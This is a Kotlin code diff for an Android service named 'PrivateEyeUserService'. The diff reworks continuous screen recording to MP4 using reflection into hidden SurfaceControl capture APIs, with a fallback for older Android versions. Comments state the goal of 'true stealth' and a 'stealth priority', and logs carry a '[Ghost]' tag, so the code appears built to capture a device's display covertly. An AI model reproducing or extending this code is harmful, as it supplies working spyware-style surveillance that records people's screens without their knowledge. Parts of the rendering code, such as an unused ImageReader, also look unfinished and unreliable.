@@ -43,6 +43,9 @@ class PrivateEyeUserService : IPrivateEyeService.Stub() {
     private var videoTrackIndex = -1
     private var recordingThread: Thread? = null
     private var windowServiceBinder: IBinder? = null
+    private var imageReader: ImageReader? = null
+    private var inputSurface: Surface? = null
+    private var lastFrameTime = 0L
     
     /**
      * Returns the process ID of this service
@@ -147,10 +150,28 @@ class PrivateEyeUserService : IPrivateEyeService.Stub() {
     
     /**
      * Get display token for SurfaceControl
+     * Tries getInternalDisplayToken first (Android 14+), then falls back to getBuiltInDisplay
      */
     private fun getDisplayToken(): IBinder? {
         try {
             val surfaceControlClass = Class.forName("android.view.SurfaceControl")
+            
+            // Try getInternalDisplayToken first (Android 14+)
+            try {
+                val getInternalDisplayTokenMethod = surfaceControlClass.getDeclaredMethod(
+                    "getInternalDisplayToken"
+                )
+                getInternalDisplayTokenMethod.isAccessible = true
+                val token = getInternalDisplayTokenMethod.invoke(null) as? IBinder
+                if (token != null) {
+                    log("[Ghost] Using getInternalDisplayToken (Android 14+)")
+                    return token
+                }
+            } catch (e: NoSuchMethodException) {
+                log("[Ghost] getInternalDisplayToken not available, trying getBuiltInDisplay")
+            }
+            
+            // Fallback to getBuiltInDisplay for older Android versions
             val getBuiltInDisplayMethod = surfaceControlClass.getDeclaredMethod(
                 "getBuiltInDisplay",
                 Int::class.javaPrimitiveType
@@ -158,7 +179,7 @@ class PrivateEyeUserService : IPrivateEyeService.Stub() {
             getBuiltInDisplayMethod.isAccessible = true
             return getBuiltInDisplayMethod.invoke(null, PRIMARY_DISPLAY_ID) as? IBinder
         } catch (e: Exception) {
-            log("[Warning] Failed to get display token: ${e.message}")
+            log("[Error] Failed to get display token: ${e.javaClass.simpleName} - ${e.message}")
             return null
         }
     }
@@ -202,10 +223,20 @@ class PrivateEyeUserService : IPrivateEyeService.Stub() {
     }
     
     /**
-     * Initialize MediaCodec encoder and MediaMuxer
+     * Initialize MediaCodec encoder and MediaMuxer with ImageReader
      */
     private fun initializeEncoder(outputPath: String) {
         try {
+            // Create ImageReader for capturing frames
+            imageReader = ImageReader.newInstance(
+                VIDEO_WIDTH,
+                VIDEO_HEIGHT,
+                PixelFormat.RGBA_8888,
+                2
+            )
+            
+            log("[Ghost] ImageReader initialized: ${VIDEO_WIDTH}x${VIDEO_HEIGHT}")
+            
             // Create MediaFormat for H.264/AVC
             val format = MediaFormat.createVideoFormat(MIME_TYPE, VIDEO_WIDTH, VIDEO_HEIGHT).apply {
                 setInteger(MediaFormat.KEY_COLOR_FORMAT, MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface)
@@ -217,6 +248,7 @@ class PrivateEyeUserService : IPrivateEyeService.Stub() {
             // Create and configure MediaCodec
             mediaCodec = MediaCodec.createEncoderByType(MIME_TYPE).apply {
                 configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE)
+                inputSurface = createInputSurface()
             }
             
             // Create MediaMuxer for MP4 container
@@ -232,107 +264,318 @@ class PrivateEyeUserService : IPrivateEyeService.Stub() {
     }
     
     /**
-     * Main capture loop - captures frames continuously
+     * Main capture loop - captures frames continuously using SurfaceControl
      */
     private fun captureLoop() {
         try {
             mediaCodec?.start()
             val bufferInfo = MediaCodec.BufferInfo()
             var frameCount = 0
+            lastFrameTime = System.nanoTime()
+            val frameIntervalNs = 1_000_000_000L / VIDEO_FRAME_RATE // ~33.3ms for 30fps
             
             log("[Ghost] Capture loop started")
             
             while (isRecording) {
                 try {
-                    // Capture frame using SurfaceControl
-                    val frameData = captureFrameData()
+                    val currentTime = System.nanoTime()
+                    val elapsedNs = currentTime - lastFrameTime
                     
-                    if (frameData != null) {
-                        // Feed frame to encoder
-                        encodeFrame(frameData, bufferInfo)
-                        frameCount++
-                        
-                        if (frameCount % 30 == 0) {
-                            log("[Ghost] Captured $frameCount frames")
+                    // Maintain 30fps timing
+                    if (elapsedNs >= frameIntervalNs) {
+                        // Capture frame using SurfaceControl
+                        if (captureSurfaceControlFrame()) {
+                            frameCount++
+                            
+                            if (frameCount % 30 == 0) {
+                                log("[Ghost] Captured $frameCount frames")
+                            }
                         }
+                        
+                        lastFrameTime = currentTime
                     }
                     
-                    // Control frame rate
-                    Thread.sleep((1000 / VIDEO_FRAME_RATE).toLong())
+                    // Process encoder output
+                    drainEncoder(bufferInfo, false)
+                    
+                    // Sleep briefly to avoid busy-waiting
+                    Thread.sleep(5)
                     
                 } catch (e: InterruptedException) {
                     log("[Ghost] Capture loop interrupted")
                     break
                 } catch (e: Exception) {
-                    log("[Error] Frame capture error: ${e.message}")
+                    log("[Error] Frame capture error: ${e.javaClass.simpleName} - ${e.message}")
                 }
             }
             
             log("[Ghost] Capture loop finished - $frameCount frames captured")
             
+            // Drain remaining frames
+            drainEncoder(bufferInfo, true)
+            
         } catch (e: Exception) {
-            log("[Error] Capture loop failed: ${e.message}")
+            log("[Error] Capture loop failed: ${e.javaClass.simpleName} - ${e.message}")
         } finally {
             finalizeRecording()
         }
     }
     
     /**
-     * Capture single frame data
+     * Capture single frame using SurfaceControl and HardwareBuffer
+     * Returns true if frame was captured successfully
      */
-    private fun captureFrameData(): ByteArray? {
+    private fun captureSurfaceControlFrame(): Boolean {
         try {
-            // Use screencap to capture frame (as a simple implementation)
-            // In production, this should use SurfaceControl for true stealth
-            val process = Runtime.getRuntime().exec(arrayOf("screencap"))
-            val data = process.inputStream.readBytes()
-            process.waitFor()
-            return if (data.isNotEmpty()) data else null
+            val displayToken = getDisplayToken()
+            if (displayToken == null) {
+                log("[Error] Display token is null")
+                return false
+            }
+            
+            val surfaceControlClass = Class.forName("android.view.SurfaceControl")
+            
+            // Try Android 14+ captureDisplay method
+            try {
+                val captureDisplayMethod = surfaceControlClass.getDeclaredMethod(
+                    "captureDisplay",
+                    Class.forName("android.view.SurfaceControl\$DisplayCaptureArgs"),
+                    Class.forName("android.view.SurfaceControl\$ScreenCaptureListener")
+                )
+                captureDisplayMethod.isAccessible = true
+                
+                // Create DisplayCaptureArgs
+                val displayCaptureArgsClass = Class.forName("android.view.SurfaceControl\$DisplayCaptureArgs")
+                val builderClass = Class.forName("android.view.SurfaceControl\$DisplayCaptureArgs\$Builder")
+                val builderConstructor = builderClass.getDeclaredConstructor(IBinder::class.java)
+                builderConstructor.isAccessible = true
+                val builder = builderConstructor.newInstance(displayToken)
+                
+                // Set size
+                val setSizeMethod = builderClass.getDeclaredMethod("setSize", Int::class.javaPrimitiveType, Int::class.javaPrimitiveType)
+                setSizeMethod.isAccessible = true
+                setSizeMethod.invoke(builder, VIDEO_WIDTH, VIDEO_HEIGHT)
+                
+                // Build args
+                val buildMethod = builderClass.getDeclaredMethod("build")
+                buildMethod.isAccessible = true
+                val captureArgs = buildMethod.invoke(builder)
+                
+                // Create ScreenCaptureListener (synchronous version)
+                val screenCaptureListenerClass = Class.forName("android.view.SurfaceControl\$ScreenCaptureListener")
+                var capturedBuffer: HardwareBuffer? = null
+                val latch = java.util.concurrent.CountDownLatch(1)
+                
+                val listener = java.lang.reflect.Proxy.newProxyInstance(
+                    screenCaptureListenerClass.classLoader,
+                    arrayOf(screenCaptureListenerClass)
+                ) { _, method, args ->
+                    if (method.name == "onScreenCaptureComplete") {
+                        val screenCapture = args?.get(0)
+                        if (screenCapture != null) {
+                            // Get HardwareBuffer from ScreenCapture
+                            val getHardwareBufferMethod = screenCapture.javaClass.getDeclaredMethod("getHardwareBuffer")
+                            getHardwareBufferMethod.isAccessible = true
+                            capturedBuffer = getHardwareBufferMethod.invoke(screenCapture) as? HardwareBuffer
+                        }
+                        latch.countDown()
+                    }
+                    null
+                }
+                
+                // Capture display
+                captureDisplayMethod.invoke(null, captureArgs, listener)
+                
+                // Wait for callback with timeout (30ms to stay within frame interval)
+                if (latch.await(30, java.util.concurrent.TimeUnit.MILLISECONDS)) {
+                    if (capturedBuffer != null) {
+                        // Process the HardwareBuffer
+                        processHardwareBuffer(capturedBuffer)
+                        return true
+                    }
+                } else {
+                    log("[Warning] captureDisplay callback timeout - frame skipped")
+                }
+                
+            } catch (e: NoSuchMethodException) {
+                log("[Ghost] captureDisplay not available, trying screenshot")
+            } catch (e: ClassNotFoundException) {
+                log("[Ghost] DisplayCaptureArgs not available, trying screenshot")
+            }
+            
+            // Fallback to screenshot method (older Android versions)
+            return captureScreenshotFallback(displayToken)
+            
+        } catch (e: NoSuchMethodException) {
+            log("[Error] SurfaceControl method not found: ${e.message}")
+            return false
+        } catch (e: IllegalAccessException) {
+            log("[Error] SurfaceControl illegal access: ${e.message}")
+            return false
         } catch (e: Exception) {
-            return null
+            log("[Error] SurfaceControl capture failed: ${e.javaClass.simpleName} - ${e.message}")
+            return false
         }
     }
     
     /**
-     * Encode frame data using MediaCodec
+     * Fallback screenshot method for older Android versions
      */
-    private fun encodeFrame(frameData: ByteArray, bufferInfo: MediaCodec.BufferInfo) {
+    private fun captureScreenshotFallback(displayToken: IBinder): Boolean {
+        try {
+            val surfaceControlClass = Class.forName("android.view.SurfaceControl")
+            
+            // Try screenshot method
+            val screenshotMethod = try {
+                surfaceControlClass.getDeclaredMethod(
+                    "screenshot",
+                    IBinder::class.java,
+                    android.graphics.Rect::class.java,
+                    Int::class.javaPrimitiveType,
+                    Int::class.javaPrimitiveType,
+                    Int::class.javaPrimitiveType
+                )
+            } catch (e: NoSuchMethodException) {
+                surfaceControlClass.getDeclaredMethod("screenshot", Int::class.javaPrimitiveType, Int::class.javaPrimitiveType)
+            }
+            
+            screenshotMethod.isAccessible = true
+            
+            val bitmap = if (screenshotMethod.parameterCount > 2) {
+                screenshotMethod.invoke(null, displayToken, null, VIDEO_WIDTH, VIDEO_HEIGHT, 0) as? Bitmap
+            } else {
+                screenshotMethod.invoke(null, VIDEO_WIDTH, VIDEO_HEIGHT) as? Bitmap
+            }
+            
+            if (bitmap != null) {
+                processBitmap(bitmap)
+                bitmap.recycle()
+                return true
+            }
+            
+            return false
+        } catch (e: Exception) {
+            log("[Error] Screenshot fallback failed: ${e.javaClass.simpleName} - ${e.message}")
+            return false
+        }
+    }
+    
+    /**
+     * Process HardwareBuffer and send to MediaCodec
+     * The HardwareBuffer needs to be rendered to the MediaCodec input surface
+     * Requires API 28+ (Android 9)
+     */
+    private fun processHardwareBuffer(hardwareBuffer: HardwareBuffer?) {
+        if (hardwareBuffer == null) {
+            log("[Error] HardwareBuffer is null")
+            return
+        }
+        
+        // Check API level
+        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.P) {
+            log("[Error] HardwareBuffer processing requires API 28+")
+            return
+        }
+        
+        try {
+            // Use ImageReader to convert HardwareBuffer to a format suitable for MediaCodec
+            imageReader?.let { reader ->
+                // The HardwareBuffer contains the pixel data
+                // We need to draw it to the MediaCodec's input surface
+                inputSurface?.let { surface ->
+                    // Create a temporary canvas to draw the buffer
+                    // TODO: Use OpenGL ES for more efficient rendering in future updates
+                    // Current implementation prioritizes compatibility over performance
+                    val canvas = surface.lockCanvas(null)
+                    try {
+                        // Convert HardwareBuffer to Bitmap for drawing
+                        val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, null)
+                        if (bitmap != null) {
+                            canvas.drawBitmap(bitmap, 0f, 0f, null)
+                        } else {
+                            log("[Warning] Failed to wrap HardwareBuffer as Bitmap - frame skipped")
+                        }
+                    } finally {
+                        surface.unlockCanvasAndPost(canvas)
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            log("[Error] HardwareBuffer processing error: ${e.javaClass.simpleName} - ${e.message}")
+        }
+    }
+    
+    /**
+     * Process Bitmap and send to MediaCodec (fallback method)
+     * Draws the bitmap to the MediaCodec input surface
+     */
+    private fun processBitmap(bitmap: Bitmap?) {
+        if (bitmap == null) {
+            log("[Error] Bitmap is null")
+            return
+        }
+        
+        try {
+            inputSurface?.let { surface ->
+                // Lock the canvas and draw the bitmap
+                val canvas = surface.lockCanvas(null)
+                try {
+                    // Scale the bitmap if needed to match the surface dimensions
+                    // Use filtering=false for faster processing (stealth priority)
+                    val scaledBitmap = if (bitmap.width != VIDEO_WIDTH || bitmap.height != VIDEO_HEIGHT) {
+                        Bitmap.createScaledBitmap(bitmap, VIDEO_WIDTH, VIDEO_HEIGHT, false)
+                    } else {
+                        bitmap
+                    }
+                    
+                    // Draw the bitmap to the canvas
+                    canvas.drawBitmap(scaledBitmap, 0f, 0f, null)
+                    
+                    // Clean up scaled bitmap if it was created
+                    if (scaledBitmap != bitmap) {
+                        scaledBitmap.recycle()
+                    }
+                } finally {
+                    surface.unlockCanvasAndPost(canvas)
+                }
+            } ?: run {
+                log("[Error] Input surface is null")
+            }
+        } catch (e: Exception) {
+            log("[Error] Bitmap processing error: ${e.javaClass.simpleName} - ${e.message}")
+        }
+    }
+    
+    /**
+     * Drain encoded data from MediaCodec
+     */
+    private fun drainEncoder(bufferInfo: MediaCodec.BufferInfo, endOfStream: Boolean) {
         try {
             mediaCodec?.let { codec ->
-                // Get input buffer
-                val inputBufferIndex = codec.dequeueInputBuffer(10000)
-                if (inputBufferIndex >= 0) {
-                    val inputBuffer = codec.getInputBuffer(inputBufferIndex)
-                    inputBuffer?.clear()
-                    inputBuffer?.put(frameData)
-                    
-                    codec.queueInputBuffer(
-                        inputBufferIndex,
-                        0,
-                        frameData.size,
-                        System.nanoTime() / 1000,
-                        0
-                    )
+                if (endOfStream) {
+                    codec.signalEndOfInputStream()
                 }
                 
-                // Get output buffer
-                var outputBufferIndex = codec.dequeueOutputBuffer(bufferInfo, 10000)
+                var outputBufferIndex = codec.dequeueOutputBuffer(bufferInfo, 0)
                 
                 while (outputBufferIndex >= 0) {
                     val outputBuffer = codec.getOutputBuffer(outputBufferIndex)
                     
                     if (outputBuffer != null && bufferInfo.size > 0) {
-                        // Write to muxer if track is added
                         if (videoTrackIndex >= 0) {
                             mediaMuxer?.writeSampleData(videoTrackIndex, outputBuffer, bufferInfo)
                         }
                     }
                     
                     codec.releaseOutputBuffer(outputBufferIndex, false)
+                    
+                    if ((bufferInfo.flags and MediaCodec.BUFFER_FLAG_END_OF_STREAM) != 0) {
+                        break
+                    }
+                    
                     outputBufferIndex = codec.dequeueOutputBuffer(bufferInfo, 0)
                 }
                 
-                // Handle format change
                 if (outputBufferIndex == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED) {
                     val format = codec.outputFormat
                     videoTrackIndex = mediaMuxer?.addTrack(format) ?: -1
@@ -341,7 +584,7 @@ class PrivateEyeUserService : IPrivateEyeService.Stub() {
                 }
             }
         } catch (e: Exception) {
-            log("[Error] Encoding error: ${e.message}")
+            log("[Error] Drain encoder error: ${e.message}")
         }
     }
     
@@ -353,6 +596,12 @@ class PrivateEyeUserService : IPrivateEyeService.Stub() {
             mediaCodec?.stop()
             mediaCodec?.release()
             mediaCodec = null
+            
+            inputSurface?.release()
+            inputSurface = null
+            
+            imageReader?.close()
+            imageReader = null
             
             mediaMuxer?.stop()
             mediaMuxer?.release()
@@ -422,6 +671,12 @@ class PrivateEyeUserService : IPrivateEyeService.Stub() {
      */
     private fun cleanup() {
         try {
+            inputSurface?.release()
+            inputSurface = null
+            
+            imageReader?.close()
+            imageReader = null
+            
             mediaCodec?.release()
             mediaCodec = null
             
